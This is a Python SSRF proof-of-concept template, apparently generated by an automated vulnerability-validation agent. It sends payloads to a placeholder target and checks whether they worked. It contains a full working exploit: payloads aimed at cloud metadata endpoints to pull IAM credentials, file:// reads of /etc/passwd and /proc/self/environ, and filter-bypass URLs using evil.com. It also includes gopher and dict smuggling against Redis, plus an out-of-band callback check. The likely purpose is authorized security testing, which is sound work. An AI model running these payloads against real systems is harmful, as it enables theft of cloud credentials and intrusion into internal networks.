#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) PoC
=======================================
Target: {{TARGET_URL}}
Parameter: {{PARAMETER}}
Vuln ID: {{VULN_ID}}

Generated by: validation-agent
Generated at: {{GENERATED_AT}}

Usage:
    python poc_ssrf_{{VULN_ID}}.py [--verbose] [--callback-server http://your-server.com]

Requirements:
    pip install requests
"""

import argparse
import json
import sys
import time
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, List, Optional
from dataclasses import dataclass

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Error: requests library required. Install with: pip install requests")
    sys.exit(1)


@dataclass
class SSRFTestResult:
    payload_type: str
    payload: str
    success: bool
    evidence: str
    response_time: float
    status_code: int
    response_snippet: str


class CallbackHandler(BaseHTTPRequestHandler):
    """Simple HTTP handler to catch SSRF callbacks"""
    received_requests = []

    def do_GET(self):
        self.received_requests.append({
            "method": "GET",
            "path": self.path,
            "headers": dict(self.headers),
            "client": self.client_address
        })
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        self.received_requests.append({
            "method": "POST",
            "path": self.path,
            "headers": dict(self.headers),
            "body": body.decode('utf-8', errors='ignore'),
            "client": self.client_address
        })
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # Suppress logging


class SSRFPoC:
    """SSRF Proof of Concept"""

    def __init__(
        self,
        target_url: str,
        parameter: str,
        param_location: str = "query",
        method: str = "GET",
        callback_server: Optional[str] = None,
        headers: Optional[Dict] = None,
        cookies: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 10,
        verbose: bool = False
    ):
        self.target_url = target_url
        self.parameter = parameter
        self.param_location = param_location
        self.method = method.upper()
        self.callback_server = callback_server
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.verbose = verbose
        self.results: List[SSRFTestResult] = []

        self.session = requests.Session()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.session.verify = False

        # SSRF payloads by category
        self.payloads = {
            "localhost": [
                "http://localhost/",
                "http://127.0.0.1/",
                "http://127.0.0.1:80/",
                "http://127.0.0.1:443/",
                "http://127.0.0.1:22/",
                "http://127.0.0.1:3306/",
                "http://127.0.0.1:6379/",
                "http://[::1]/",
                "http://0.0.0.0/",
                "http://0/",
            ],
            "internal_network": [
                "http://192.168.0.1/",
                "http://192.168.1.1/",
                "http://10.0.0.1/",
                "http://172.16.0.1/",
                "http://169.254.169.254/",  # AWS metadata
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",  # GCP metadata
                "http://100.100.100.200/",  # Alibaba Cloud metadata
            ],
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/meta-data/hostname",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",  # DigitalOcean
            ],
            "file_protocol": [
                "file:///etc/passwd",
                "file:///etc/hosts",
                "file:///proc/self/environ",
                "file:///proc/self/cmdline",
                "file://localhost/etc/passwd",
                "file://127.0.0.1/etc/passwd",
            ],
            "bypass_techniques": [
                "http://127.1/",
                "http://0177.0.0.1/",  # Octal
                "http://0x7f.0x0.0x0.0x1/",  # Hex
                "http://2130706433/",  # Decimal
                "http://127.0.0.1.nip.io/",  # DNS rebinding
                "http://localhost.localdomain/",
                "http://127.0.0.1%00@evil.com/",  # Null byte
                "http://127.0.0.1%2500@evil.com/",  # Double encoding
                "http://evil.com@127.0.0.1/",  # Basic auth bypass
                "http://127.0.0.1#@evil.com/",  # Fragment
            ],
            "protocol_smuggling": [
                "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",  # Redis
                "dict://127.0.0.1:6379/info",
                "ldap://127.0.0.1:389/",
                "tftp://127.0.0.1/test",
            ],
        }

        # Indicators of successful SSRF
        self.success_indicators = {
            "localhost_indicators": [
                "nginx", "apache", "Server:", "Welcome to",
                "It works!", "Index of", "Directory listing"
            ],
            "aws_metadata": [
                "ami-id", "instance-id", "security-credentials",
                "iam", "meta-data"
            ],
            "file_read": [
                "root:x:0:0", "/bin/bash", "localhost",
                "PATH=", "HOME="
            ],
            "internal_service": [
                "Redis", "MySQL", "PostgreSQL", "MongoDB",
                "Elasticsearch", "rabbitmq"
            ],
            "error_indicators": [
                "connection refused", "timeout", "no route",
                "getaddrinfo", "Name or service not known"
            ]
        }

    def log(self, message: str):
        if self.verbose:
            print(f"[*] {message}")

    def make_request(self, payload: str) -> tuple:
        """Make request with SSRF payload"""
        start_time = time.time()

        try:
            if self.param_location == "query":
                params = {self.parameter: payload}
                response = self.session.request(
                    self.method,
                    self.target_url,
                    params=params,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout
                )
            elif self.param_location == "body":
                if "json" in self.headers.get("Content-Type", ""):
                    data = json.dumps({self.parameter: payload})
                else:
                    data = {self.parameter: payload}
                response = self.session.request(
                    self.method,
                    self.target_url,
                    data=data,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout
                )
            elif self.param_location == "header":
                headers = {**self.headers, self.parameter: payload}
                response = self.session.request(
                    self.method,
                    self.target_url,
                    headers=headers,
                    cookies=self.cookies,
                    timeout=self.timeout
                )
            else:
                raise ValueError(f"Unknown parameter location: {self.param_location}")

            elapsed = time.time() - start_time
            return response, elapsed, None

        except requests.exceptions.Timeout:
            return None, self.timeout, "timeout"
        except requests.exceptions.ConnectionError as e:
            return None, time.time() - start_time, str(e)
        except Exception as e:
            return None, time.time() - start_time, str(e)

    def check_success(self, response, payload_type: str) -> tuple:
        """Check if SSRF was successful based on response"""
        if response is None:
            return False, "No response received"

        response_text = response.text.lower()

        # Check for success indicators based on payload type
        if payload_type == "localhost":
            for indicator in self.success_indicators["localhost_indicators"]:
                if indicator.lower() in response_text:
                    return True, f"Found indicator: {indicator}"

        elif payload_type in ["internal_network", "cloud_metadata"]:
            for indicator in self.success_indicators["aws_metadata"]:
                if indicator.lower() in response_text:
                    return True, f"Cloud metadata found: {indicator}"

        elif payload_type == "file_protocol":
            for indicator in self.success_indicators["file_read"]:
                if indicator.lower() in response_text:
                    return True, f"File content found: {indicator}"

        # Generic check: response differs significantly from error
        if response.status_code == 200 and len(response.text) > 100:
            # Could be successful if response contains expected data
            return None, "Needs manual verification"

        return False, "No success indicators found"

    def test_payload_category(self, category: str) -> List[SSRFTestResult]:
        """Test all payloads in a category"""
        self.log(f"Testing {category} payloads...")
        results = []

        for payload in self.payloads.get(category, []):
            self.log(f"  Testing: {payload[:50]}...")

            response, elapsed, error = self.make_request(payload)

            if error:
                evidence = f"Error: {error}"
                success = False
                status_code = 0
                snippet = ""
            else:
                success, evidence = self.check_success(response, category)
                status_code = response.status_code
                snippet = response.text[:500] if response.text else ""

            result = SSRFTestResult(
                payload_type=category,
                payload=payload,
                success=success if success is not None else False,
                evidence=evidence,
                response_time=elapsed,
                status_code=status_code,
                response_snippet=snippet
            )
            results.append(result)

            if success:
                self.log(f"  [+] Potential SSRF! {evidence}")

        return results

    def test_callback(self, callback_url: str) -> SSRFTestResult:
        """Test SSRF with external callback"""
        self.log(f"Testing callback to: {callback_url}")

        response, elapsed, error = self.make_request(callback_url)

        if error:
            return SSRFTestResult(
                payload_type="callback",
                payload=callback_url,
                success=False,
                evidence=f"Error: {error}",
                response_time=elapsed,
                status_code=0,
                response_snippet=""
            )

        return SSRFTestResult(
            payload_type="callback",
            payload=callback_url,
            success=True,  # Will verify with callback server
            evidence="Request sent, check callback server",
            response_time=elapsed,
            status_code=response.status_code if response else 0,
            response_snippet=response.text[:500] if response and response.text else ""
        )

    def run_all_tests(self) -> Dict:
        """Run all SSRF tests"""
        print(f"\n{'='*60}")
        print(f"SSRF PoC")
        print(f"Target: {self.target_url}")
        print(f"Parameter: {self.parameter} ({self.param_location})")
        print(f"{'='*60}\n")

        all_results = []

        # Test each payload category
        for category in self.payloads.keys():
            results = self.test_payload_category(category)
            all_results.extend(results)

        # Test callback if provided
        if self.callback_server:
            callback_result = self.test_callback(
                f"{self.callback_server}/ssrf-test-{int(time.time())}"
            )
            all_results.append(callback_result)

        self.results = all_results

        # Summarize results
        successful_tests = [r for r in all_results if r.success]

        print(f"\n{'='*60}")
        print("RESULTS SUMMARY")
        print(f"{'='*60}")
        print(f"Total tests: {len(all_results)}")
        print(f"Potential vulnerabilities: {len(successful_tests)}")

        if successful_tests:
            print(f"\n[!] POTENTIAL SSRF DETECTED!")
            print(f"\nSuccessful payloads:")
            for r in successful_tests:
                print(f"  - [{r.payload_type}] {r.payload[:60]}...")
                print(f"    Evidence: {r.evidence}")
        else:
            print(f"\n[*] No clear vulnerabilities (manual verification recommended)")

        return {
            "target": self.target_url,
            "parameter": self.parameter,
            "vulnerable": len(successful_tests) > 0,
            "total_tests": len(all_results),
            "successful_tests": len(successful_tests),
            "results": [
                {
                    "type": r.payload_type,
                    "payload": r.payload,
                    "success": r.success,
                    "evidence": r.evidence,
                    "response_time": r.response_time,
                    "status_code": r.status_code,
                    "response_snippet": r.response_snippet[:200]
                }
                for r in all_results
            ]
        }


def main():
    parser = argparse.ArgumentParser(description="SSRF PoC")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--proxy", type=str, help="HTTP proxy")
    parser.add_argument("--callback-server", type=str, help="Callback server URL for OOB testing")
    parser.add_argument("--output", "-o", type=str, help="Output file for results (JSON)")
    args = parser.parse_args()

    poc = SSRFPoC(
        target_url="{{TARGET_URL}}",
        parameter="{{PARAMETER}}",
        param_location="{{PARAMETER_LOCATION}}",
        method="{{METHOD}}",
        callback_server=args.callback_server,
        proxy=args.proxy,
        verbose=args.verbose
    )

    results = poc.run_all_tests()

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults saved to: {args.output}")

    sys.exit(0 if results["vulnerable"] else 1)


if __name__ == "__main__":
    main()
